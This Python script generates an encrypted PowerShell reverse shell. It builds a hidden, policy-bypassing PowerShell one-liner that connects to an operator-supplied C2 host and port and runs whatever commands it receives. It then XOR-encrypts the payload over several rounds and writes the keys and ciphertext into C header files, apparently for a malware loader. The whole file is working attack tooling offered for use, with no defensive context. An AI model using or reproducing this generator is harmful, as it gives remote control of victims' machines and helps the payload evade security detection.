import random
import argparse

# === CLI ARGUMENT PARSING ===
parser = argparse.ArgumentParser(description="Encrypt a PowerShell Reverse Shell")
parser.add_argument('-r', '--rounds', type=int, required=True, help="Number of encryption rounds")
parser.add_argument('-k', '--keylen', type=int, required=True, help="Key length in bytes")
parser.add_argument('-c', '--c2', required=True, help="C2 server IP or domain")
parser.add_argument('-p', '--port', required=True, help="C2 port")
args = parser.parse_args()

ROUNDS = args.rounds
KEY_LEN = args.keylen
C2_HOST = args.c2
C2_PORT = args.port

# === POWERSHELL PAYLOAD GENERATOR ===
def build_url(c2_host, c2_port):
    return f'''powershell -NoP -NonI -W Hidden -Exec Bypass -Command " \
$client = New-Object System.Net.Sockets.TCPClient('{c2_host}',{c2_port}); \
$stream = $client.GetStream(); \
$writer = New-Object System.IO.StreamWriter($stream); \
$reader = New-Object System.IO.StreamReader($stream); \
$writer.AutoFlush = $true; \
while ($true) {{ \
    $writer.Write('PS ' + (Get-Location).Path + '> '); \
    $input = $reader.ReadLine(); \
    if ($input -eq 'exit') {{ break }}; \
    try {{ \
        $output = Invoke-Expression $input 2>&1 | Out-String; \
        $writer.WriteLine($output); \
    }} catch {{ \
        $writer.WriteLine('Error: ' + $_); \
    }} \
}} \
$client.Close();"'''

# Generate URL
URL = build_url(C2_HOST, C2_PORT)

# === ENCRYPTION ===
url_bytes = bytearray(URL.encode('utf-8'))
URL_LEN = len(url_bytes)

def generate_key(seed):
    random.seed(seed * 12345)
    return bytearray((random.randint(0, 25) + ord('a')) for _ in range(KEY_LEN))

keys = []
for i in range(ROUNDS):
    key = generate_key(i)
    keys.append(key)
    for j in range(URL_LEN):
        url_bytes[j] ^= key[j % KEY_LEN]

# === OUTPUT HEADERS ===
def write_keys_to_header(keys, filename="keys.h"):
    with open(filename, "w") as f:
        f.write(f"#define KEY_LEN {KEY_LEN}\n")
        f.write(f"#define ROUNDS {ROUNDS}\n\n")
        f.write("uint8_t keys[ROUNDS][KEY_LEN] = {\n")
        for key in keys:
            f.write("    {\n        ")
            f.write(", ".join(f"0x{k:02X}" for k in key))
            f.write("\n    },\n")
        f.write("};\n")

def write_encrypted_url_to_header(data, filename="encrypted_url.h"):
    with open(filename, "w") as f:
        f.write(f"#define URL_LEN {len(data)}\n")
        f.write("uint8_t encrypted_url[URL_LEN] = {\n    ")
        f.write(", ".join(f"0x{b:02X}" for b in data))
        f.write("\n};\n")

write_keys_to_header(keys)
write_encrypted_url_to_header(url_bytes)

print("Generated: keys.h and encrypted_url.h")
